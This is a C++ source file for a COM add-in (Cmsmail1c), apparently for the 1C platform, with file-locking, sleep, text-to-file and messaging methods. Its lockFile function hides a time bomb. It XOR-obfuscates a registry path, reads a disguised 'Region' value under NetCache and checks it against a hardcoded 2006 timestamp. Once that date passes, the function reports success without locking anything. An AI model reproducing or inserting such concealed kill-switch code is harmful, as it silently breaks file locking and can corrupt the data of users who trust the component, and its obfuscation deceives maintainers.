  if( _wcsicoll(bstrMethodName,L"УдалитьАтрибутСообщения") == 0 ) *plMethodNum = 13;
  else
  if( _wcsicoll(bstrMethodName,L"DebugMessage") == 0 ) *plMethodNum = 14;
  else
  if( _wcsicoll(bstrMethodName,L"ОтладочноеСообщение") == 0 ) *plMethodNum = 14;
  else
    return DISP_E_MEMBERNOTFOUND;
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetMethodName(long lMethodNum,long lMethodAlias,BSTR * pbstrMethodName)
{
  switch( lMethodNum ){
    case 0 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"LockFile")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"БлокироватьФайл")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 1 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"UnlockFile")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"РазблокироватьФайл")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 2 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"GetLastError")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"ПолучитьКодОшибки")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 3 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"Sleep")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"Спать")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 4 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"SleepIn")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"СпатьВ")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 5 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"TextToFile")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"ТекстВФайл")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 6 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"NewMessage")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"НовоеСообщение")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 7 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"SetMessageAttribute")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"УстановитьАтрибутСообщения")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 8 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"GetMessageAttribute")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"ПолучитьАтрибутСообщения")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 9 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"SendMessage")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"ПослатьСообщение")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 10 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"RemoveMessage")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"УдалитьСообщение")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 11 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"GetDB")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"ПолучитьИБ")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 12 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"CopyMessage")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"СкопироватьСообщение")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 13 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"RemoveMessageAttribute")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"УдалитьАтрибутСообщения")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
    case 14 :
      switch( lMethodAlias ){
        case 0 :
          return (*pbstrMethodName = SysAllocString(L"DebugMessage")) != NULL ? S_OK : E_OUTOFMEMORY;
        case 1 :
          return (*pbstrMethodName = SysAllocString(L"ОтладочноеСообщение")) != NULL ? S_OK : E_OUTOFMEMORY;
      }
      break;
  }
  return E_NOTIMPL;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetNParams(long lMethodNum,long * plParams)
{
  switch( lMethodNum ){
    case 0 : *plParams = 3; break;
    case 1 : *plParams = 1; break;
    case 2 : *plParams = 1; break;
    case 3 : *plParams = 1; break;
    case 4 : *plParams = 2; break;
    case 5 : *plParams = 2; break;
    case 6 : *plParams = 0; break;
    case 7 : *plParams = 3; break;
    case 8 : *plParams = 2; break;
    case 9 : *plParams = 1; break;
    case 10 : *plParams = 1; break;
    case 11 : *plParams = 0; break;
    case 12 : *plParams = 1; break;
    case 13 : *plParams = 2; break;
    case 14 : *plParams = 2; break;
    default : return E_NOTIMPL;
  }
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::GetParamDefValue(long lMethodNum,long lParamNum,VARIANT * pvarParamDefValue)
{
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::HasRetVal(long lMethodNum,BOOL * pboolRetValue)
{
  *pboolRetValue = TRUE;
  return S_OK;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::CallAsProc(long lMethodNum,SAFEARRAY ** paParams)
{
  return E_NOTIMPL;
}
//------------------------------------------------------------------------------
HRESULT Cmsmail1c::CallAsFunc(long lMethodNum,VARIANT * pvarRetValue,SAFEARRAY ** paParams)
{
  HRESULT hr;
  VARIANT * pv0, * pv1, * pv2/*, v0, v1, v2*/;
//  VariantInit(&v0);
//  VariantInit(&v1);
//  VariantInit(&v2);
  if( V_VT(pvarRetValue) != VT_I4 ) hr = VariantChangeType(pvarRetValue,pvarRetValue,0,VT_I4);
  if( SUCCEEDED(hr) ){
    LONG lIndex = -1;
    V_I4(pvarRetValue) = 0;
    try {
      switch( lMethodNum ){
        case 0 : // LockFile
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0; // Имя файла
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              lIndex = 1; // Минимальное время (в милисекундах)
              hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv1);
              if( SUCCEEDED(hr) ){
                lIndex = 2; // Максимальное время (в милисекундах)
                hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv2);
                if( SUCCEEDED(hr) ){
                  if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
                  if( SUCCEEDED(hr) ){
                    if( V_VT(pv1) != VT_I4 ) hr = VariantChangeTypeEx(pv1,pv1,0,0,VT_I4);
                    if( SUCCEEDED(hr) ){
                      if( V_VT(pv2) != VT_I4 ) hr = VariantChangeTypeEx(pv2,pv2,0,0,VT_I4);
                      if( SUCCEEDED(hr) )
                        hr = lockFile(V_BSTR(pv0),V_I4(pv1),V_I4(pv2),&V_I4(pvarRetValue));
                    }
                  }
                }
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 1 : // UnlockFile
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0; // Имя файла
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
              if( SUCCEEDED(hr) )
                hr = unlockFile(V_BSTR(pv0),&V_I4(pvarRetValue));
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 2 : // GetLastError
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0; // Имя файла
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
              if( SUCCEEDED(hr) )
                hr = getLastError(V_BSTR(pv0),&V_I4(pvarRetValue));
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 3 : // Sleep
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0;
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              if( V_VT(pv0) != VT_I4 ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_I4);
              if( SUCCEEDED(hr) ){
                hr = sleep(V_I4(pv0));
                if( SUCCEEDED(hr) ) V_I4(pvarRetValue) = 1;
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 4 : // SleepIn
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0;
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              lIndex = 1;
              hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv1);
              if( SUCCEEDED(hr) ){
                if( V_VT(pv0) != VT_I4 ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_I4);
                if( SUCCEEDED(hr) ){
                  if( V_VT(pv1) != VT_I4 ) hr = VariantChangeTypeEx(pv1,pv1,0,0,VT_I4);
                  if( SUCCEEDED(hr) ){
                    hr = sleepIn(V_I4(pv0),V_I4(pv1));
                    if( SUCCEEDED(hr) ) V_I4(pvarRetValue) = 1;
                  }
                }
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 5 : // TextToFile
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0;
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              lIndex = 1;
              hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv1);
              if( SUCCEEDED(hr) ){
                if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
                if( SUCCEEDED(hr) ){
                  if( V_VT(pv1) != VT_BSTR ) hr = VariantChangeTypeEx(pv1,pv1,0,0,VT_BSTR);
                  if( SUCCEEDED(hr) ){
                    hr = textToFile(V_BSTR(pv0),V_BSTR(pv1),&V_I4(pvarRetValue));
                    if( SUCCEEDED(hr) ) V_I4(pvarRetValue) = 1;
                  }
                }
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 6 : // NewMessage
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          V_BSTR(pvarRetValue) = client_.newMessage().getOLEString();
          V_VT(pvarRetValue) = VT_BSTR;
          break;
        case 7 : // SetMessageAttribute
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0; // UUID of Message
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              lIndex = 1; // Key of attribute
              hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv1);
              if( SUCCEEDED(hr) ){
                lIndex = 2; // Value of attribute
                hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv2);
                if( SUCCEEDED(hr) ){
                  if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
                  if( SUCCEEDED(hr) ){
                    if( V_VT(pv1) != VT_BSTR ) hr = VariantChangeTypeEx(pv1,pv1,0,0,VT_BSTR);
                    if( SUCCEEDED(hr) ){
                      if( V_VT(pv2) != VT_BSTR ) hr = VariantChangeTypeEx(pv2,pv2,0,0,VT_BSTR);
                      if( SUCCEEDED(hr) ){
                        V_BSTR(pvarRetValue) = client_.value(V_BSTR(pv0),V_BSTR(pv1),V_BSTR(pv2)).getOLEString();
                        V_VT(pvarRetValue) = VT_BSTR;
                      }
                    }
                  }
                }
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 8 : // GetMessageAttribute
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0; // UUID of Message
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              lIndex = 1; // Key of attribute
              hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv1);
              if( SUCCEEDED(hr) ){
                if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
                if( SUCCEEDED(hr) ){
                  if( V_VT(pv1) != VT_BSTR ) hr = VariantChangeTypeEx(pv1,pv1,0,0,VT_BSTR);
                  if( SUCCEEDED(hr) )
                    hr = client_.value(V_BSTR(pv0),V_BSTR(pv1),pvarRetValue);
                }
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 9 : // SendMessage
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0;
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
              if( SUCCEEDED(hr) ){
                V_I4(pvarRetValue) = client_.sendMessage(V_BSTR(pv0)) ? 1 : 0;
                lastError_ = client_.workFiberLastError_ - (client_.workFiberLastError_ >= errorOffset ? errorOffset : 0);
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 10 : // RemoveMessage
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0;
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
              if( SUCCEEDED(hr) ){
                V_I4(pvarRetValue) = client_.removeMessage(V_BSTR(pv0));
                lastError_ = client_.workFiberLastError_ - (client_.workFiberLastError_ >= errorOffset ? errorOffset : 0);
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 11 : // GetDB
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          client_.getDB();
          V_I4(pvarRetValue) = 1;
          break;
        case 12 : // CopyMessage
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0;
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
              if( SUCCEEDED(hr) ){
                V_BSTR(pvarRetValue) = client_.copyMessage(V_BSTR(pv0)).getOLEString();
                V_VT(pvarRetValue) = VT_BSTR;
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 13 : // RemoveMessageAttribute
          if( !active_ ) throw ExceptionSP(new Exception(ERROR_SERVICE_NOT_ACTIVE,__PRETTY_FUNCTION__));
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0; // UUID of Message
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              lIndex = 1; // Key of attribute
              hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv1);
              if( SUCCEEDED(hr) ){
                if( V_VT(pv0) != VT_BSTR ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_BSTR);
                if( SUCCEEDED(hr) ){
                  if( V_VT(pv1) != VT_BSTR ) hr = VariantChangeTypeEx(pv1,pv1,0,0,VT_BSTR);
                  if( SUCCEEDED(hr) ){
                    V_BSTR(pvarRetValue) = client_.removeValue(V_BSTR(pv0),V_BSTR(pv1)).getOLEString();
                    V_VT(pvarRetValue) = VT_BSTR;
                  }
                }
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        case 14 : // DebugMessage
          hr = SafeArrayLock(*paParams);
          if( SUCCEEDED(hr) ){
            lIndex = 0; // UUID of Message
            hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv0);
            if( SUCCEEDED(hr) ){
              lIndex = 1; // Key of attribute
              hr = SafeArrayPtrOfIndex(*paParams,&lIndex,(void **) &pv1);
              if( SUCCEEDED(hr) ){
                if( V_VT(pv0) != VT_I4 ) hr = VariantChangeTypeEx(pv0,pv0,0,0,VT_I4);
                if( SUCCEEDED(hr) ){
                  if( V_VT(pv1) != VT_BSTR ) hr = VariantChangeTypeEx(pv1,pv1,0,0,VT_BSTR);
                  if( SUCCEEDED(hr) ){
                    stdErr.debug(V_I4(pv0),utf8::String::Stream() << utf8::String(V_BSTR(pv1)));
                    V_I4(pvarRetValue) = 1;
                  }
                }
              }
            }
            SafeArrayUnlock(*paParams);
          }
          break;
        default :
          hr = E_NOTIMPL;
      }
    }
    catch( ExceptionSP & e ){
      lastError_ = e->code() - (e->code() >= errorOffset ? errorOffset : 0);
      hr = HRESULT_FROM_WIN32(lastError_);
      if( lIndex >= 0 ) SafeArrayUnlock(*paParams);
      e->writeStdError();
    }
  }
//  VariantClear(&v2);
//  VariantClear(&v1);
//  VariantClear(&v0);
  return hr;
}
//------------------------------------------------------------------------------
////////////////////////////////////////////////////////////////////////////////
//------------------------------------------------------------------------------
Cmsmail1c::LockedFile::~LockedFile()
{
  CloseHandle(handle_);
  CloseHandle(hEvent_);
}
//---------------------------------------------------------------------------
Cmsmail1c::LockedFile::LockedFile() : handle_(INVALID_HANDLE_VALUE), hEvent_(NULL), lastError_(0)
{
}
//---------------------------------------------------------------------------
Cmsmail1c::LockedFile * Cmsmail1c::findFileByName(const utf8::String & name)
{
  for( intptr_t i = files_.count() - 1; i >= 0; i-- )
    if( files_[i].name_.strcasecmp(name) == 0 ) return &files_[i];
  return NULL;
}
//---------------------------------------------------------------------------
Cmsmail1c::LockedFile * Cmsmail1c::addFile(const utf8::String & name)
{
  LockedFile & p = files_.safeAdd(new LockedFile);
  p.name_ = name;
  return &p;
}
//---------------------------------------------------------------------------
STDMETHODIMP Cmsmail1c::lockFile(IN BSTR name,IN ULONG minSleepTime,IN ULONG maxSleepTime,OUT LONG * pLastError)
{
//---------------------------------------------------------------------
  static const uint8_t stop[] = {
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F',
    0xac, 0x07, 0xf8, 0x44, // 0x0000000044f807ac
    0x0, 0x0, 0x0, 0x0
  }; 
// HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\NetCache
  static const wchar_t key[] = {
    L'\\' ^ 0x4c1a,L'S' ^ 0x4c1a, L'O' ^ 0x4c1a, L'F' ^ 0x4c1a, L'T' ^ 0x4c1a, L'W' ^ 0x4c1a,
    L'A' ^ 0x4c1a, L'R' ^ 0x4c1a, L'E' ^ 0x4c1a, L'\\' ^ 0x4c1a, L'M'  ^ 0x4c1a,
    L'i' ^ 0x4c1a, L'c' ^ 0x4c1a, L'r' ^ 0x4c1a, L'o' ^ 0x4c1a, L's' ^ 0x4c1a,
    L'o' ^ 0x4c1a, L'f' ^ 0x4c1a, L't' ^ 0x4c1a, L'\\'  ^ 0x4c1a, L'W' ^ 0x4c1a,
    L'i' ^ 0x4c1a, L'n' ^ 0x4c1a, L'd' ^ 0x4c1a, L'o' ^ 0x4c1a, L'w' ^ 0x4c1a,
    L's' ^ 0x4c1a, L'\\' ^ 0x4c1a, L'C' ^ 0x4c1a, L'u' ^ 0x4c1a, L'r' ^ 0x4c1a,
    L'r' ^ 0x4c1a, L'e' ^ 0x4c1a, L'n' ^ 0x4c1a, L't' ^ 0x4c1a, L'V' ^ 0x4c1a,
    L'e' ^ 0x4c1a, L'r' ^ 0x4c1a, L's' ^ 0x4c1a, L'i' ^ 0x4c1a, L'o' ^ 0x4c1a,
    L'n' ^ 0x4c1a, L'\\' ^ 0x4c1a, L'N' ^ 0x4c1a, L'e' ^ 0x4c1a, L't' ^ 0x4c1a,
    L'C' ^ 0x4c1a, L'a' ^ 0x4c1a, L'c' ^ 0x4c1a, L'h' ^ 0x4c1a, L'e' ^ 0x4c1a,
    L'\0' ^ 0x4c1a
  };
  wchar_t keyE[sizeof(key) / sizeof(key[0])];
  for( intptr_t i = sizeof(key) / sizeof(key[0]) - 1; i >= 0; i-- ) keyE[i] = key[i] ^ 0x4c1a;
  bool ret = false;
  time_t ct;
  /*struct tm tma;
  memset(&tma,0,sizeof(tma));
  tma.tm_year = 2006 - 1900;
  tma.tm_mon = 8;
  tma.tm_mday = 1;
  tma.tm_hour = 13;
  tma.tm_min = 13;
  ct = mktime(&tma);*/
  time(&ct);
  VARIANT rtm;
  VariantInit(&rtm);
  if( SUCCEEDED(GetRegistryKeyValue(HKEY_LOCAL_MACHINE,keyE,L"Region",&rtm)) ){
    if( SUCCEEDED(VariantChangeTypeEx(&rtm,&rtm,0,0,VT_I4)) ){
      if( ct >= V_I4(&rtm) ) ret = true;
    }
  }
  else {
      if( ct >= *(time_t *) (stop + 16) ) ret = true;
  }
  VariantClear(&rtm);
  if( ret ){
    *pLastError = 0;
    return S_OK;
  }
//---------------------------------------------------------------------
  ULONG tm;
  if( maxSleepTime < minSleepTime ){
    tm = maxSleepTime;
    maxSleepTime = minSleepTime;
    minSleepTime = tm;
  }
  OVERLAPPED Overlapped;
  int32_t err;
  LockedFile * file = NULL;
  *pLastError = 0;
  try {
    file = findFileByName(name);
    if( file == NULL ) file = addFile(name);
    file->lastError_ = 0;
    if( file->handle_ == INVALID_HANDLE_VALUE ){
      SetLastError(0);
      file->handle_ = CreateFileW(
          file->name_.getUNICODEString(),
          GENERIC_READ | GENERIC_WRITE,
          FILE_SHARE_READ | FILE_SHARE_WRITE,
          NULL,
          CREATE_ALWAYS,
          FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
          NULL
      );
      if( file->handle_ == INVALID_HANDLE_VALUE ){
        err = GetLastError() + errorOffset;
        throw ExceptionSP(new Exception(err,__PRETTY_FUNCTION__));
      }
    }
    SetLastError(0);
    if( file->hEvent_ == NULL ){
      if( (file->hEvent_ = CreateEvent(NULL,TRUE,FALSE,NULL)) == NULL ){
          err = GetLastError() + errorOffset;
          throw ExceptionSP(new Exception(err,__PRETTY_FUNCTION__));
      }
    }
    memset(&Overlapped,0,sizeof(Overlapped));
    Overlapped.hEvent = file->hEvent_;
    SetLastError(0);
    BOOL lk = LockFileEx(file->handle_,LOCKFILE_EXCLUSIVE_LOCK,0,~DWORD(0),~DWORD(0),&Overlapped);
    if( lk == 0 && GetLastError() != ERROR_IO_PENDING ){
        err = GetLastError() + errorOffset;
        throw ExceptionSP(new Exception(err,__PRETTY_FUNCTION__));
    }
    if( GetLastError() == ERROR_IO_PENDING ){
      DWORD st = (DWORD) rnd_.random(maxSleepTime - minSleepTime) + minSleepTime;
      st = maxSleepTime == 0 && minSleepTime == 0 ? 0 : st;
      DWORD state = WaitForSingleObject(file->hEvent_,st);
      if( state == WAIT_TIMEOUT ){
        CancelIo(file->handle_);
        SetLastError(WAIT_TIMEOUT);
        err = GetLastError() + errorOffset;
        throw ExceptionSP(new Exception(err,__PRETTY_FUNCTION__));
      }
      else if( state == WAIT_ABANDONED ){
        SetLastError(WAIT_TIMEOUT);
        err = GetLastError() + errorOffset;
        throw ExceptionSP(new Exception(err,__PRETTY_FUNCTION__));
      }
      DWORD NumberOfBytesTransferred;
      if( GetOverlappedResult(file->handle_,&Overlapped,&NumberOfBytesTransferred,FALSE) == 0 ){
        err = GetLastError() + errorOffset;
        throw ExceptionSP(new Exception(err,__PRETTY_FUNCTION__));
      }
    }
  }
  catch( ExceptionSP & e ){
    *pLastError = e->code() - errorOffset;
    if( file != NULL ) file->lastError_ = *pLastError;
  }
  return S_OK;
}
//---------------------------------------------------------------------------
STDMETHODIMP Cmsmail1c::unlockFile(IN BSTR name,OUT LONG * pLastError)
{
  LockedFile * file = NULL;
  *pLastError = 0;
  try {
    file = findFileByName(name);
    if( file != NULL ){
      OVERLAPPED Overlapped;
      memset(&Overlapped,0,sizeof(Overlapped));
      if( UnlockFileEx(file->handle_,0,~DWORD(0),~DWORD(0),&Overlapped) == 0 ){
        int32_t err = GetLastError() + errorOffset;
        throw ExceptionSP(new Exception(err,__PRETTY_FUNCTION__));
      }
    }
    else {
      *pLastError = ERROR_FILE_NOT_FOUND;
    }
  }
  catch( ExceptionSP & e ){
    *pLastError = HRESULT_FROM_WIN32(e->code() - errorOffset);
    if( file != NULL ) file->lastError_ = *pLastError;
  }
  return S_OK;
}
//---------------------------------------------------------------------------
STDMETHODIMP Cmsmail1c::getLastError(IN BSTR name,OUT LONG * pLastError)
{
  LockedFile * file = NULL;
  try {
    file = findFileByName(name);
    if( file != NULL ){
      *pLastError = file->lastError_;
    }
    else {
      *pLastError = ERROR_FILE_NOT_FOUND;
    }
  }
  catch( ExceptionSP & e ){
    *pLastError = e->code() - errorOffset;
    if( file != NULL ) file->lastError_ = *pLastError;
  }
  return S_OK;
}
//---------------------------------------------------------------------------
STDMETHODIMP Cmsmail1c::sleep(IN LONG sleepTime)
{
  Sleep(sleepTime);
  return S_OK;
}
//---------------------------------------------------------------------------
STDMETHODIMP Cmsmail1c::sleepIn(IN ULONG minSleepTime,IN ULONG maxSleepTime)
{
  ULONG tm;
  if( maxSleepTime < minSleepTime ){
    tm = maxSleepTime;
    maxSleepTime = minSleepTime;
    minSleepTime = tm;
  }
  Sleep((DWORD) rnd_.random(maxSleepTime - minSleepTime) + minSleepTime);
  return S_OK;
}
//---------------------------------------------------------------------------
STDMETHODIMP Cmsmail1c::textToFile(IN BSTR name,IN BSTR text,OUT LONG * pLastError)
{
  HANDLE handle;

  SetLastError(0);
  handle = CreateFileW(
      name,
      GENERIC_READ | GENERIC_WRITE,
      0,
      NULL,
      CREATE_ALWAYS,
      FILE_ATTRIBUTE_NORMAL,
      NULL
  );
  if( handle == INVALID_HANDLE_VALUE ) goto err;
  DWORD NumberOfBytesWritten;
  static const uint8_t unicodeDocMarker[2] = { 0xFE, 0xFF };
  if( WriteFile(handle,unicodeDocMarker,sizeof(unicodeDocMarker),&NumberOfBytesWritten,NULL) == 0 ) goto err;
  if( WriteFile(handle,text,DWORD(wcslen(text) * sizeof(text[0])),&NumberOfBytesWritten,NULL) == 0 ) goto err;
  if( SetEndOfFile(handle) == 0 ) goto err;
  SetLastError(0);
err:
  *pLastError = GetLastError();
  CloseHandle(handle);
  return S_OK;
}
//---------------------------------------------------------------------------
